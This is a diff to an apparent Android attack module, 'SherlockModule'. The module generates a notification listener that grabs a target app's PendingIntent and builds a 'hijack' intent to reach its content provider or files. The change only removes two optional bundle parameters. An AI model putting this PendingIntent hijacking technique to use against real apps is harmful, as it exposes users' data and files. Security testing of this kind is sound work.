@@ -28,8 +28,6 @@ class SherlockModule(App):
             OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
             OptStr("TARGET_PACKAGE", [True, "Target package name"]),
             OptStr("TARGET_CLASS", [False, "Target class name"]),
-            OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
-            OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
             OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
             OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
             OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
@@ -62,8 +60,6 @@ class SherlockModule(App):
         provider_uri = opts['PROVIDER_URI']
         target_package = opts['TARGET_PACKAGE']
         target_class = opts['TARGET_CLASS']
-        bundle_extra = opts['BUNDLE_EXTRA']
-        bundle_parcel = opts['BUNDLE_PARCEL']
         base_action = opts['BASE_ACTION']
         request_code = opts['REQUEST_CODE']
         provider_type = opts['PROVIDER_TYPE']
@@ -125,8 +121,6 @@ class SherlockModule(App):
             ],
             on_notif_posted=[
                 f'if (!sbn.getPackageName().equals("{target_package}")) {{ return; }}',
-                f'Bundle bundle = getIntent().getBundleExtra("{bundle_extra}");' if bundle_extra != "" else "",
-                f'PendingIntent pi = bundle.getParcelable("{bundle_parcel}");' if bundle_extra != "" else "",
                 "PendingIntent pi = sbn.getNotification().contentIntent;",
                 self._template.build_intent(
                     intent_var="hijack",
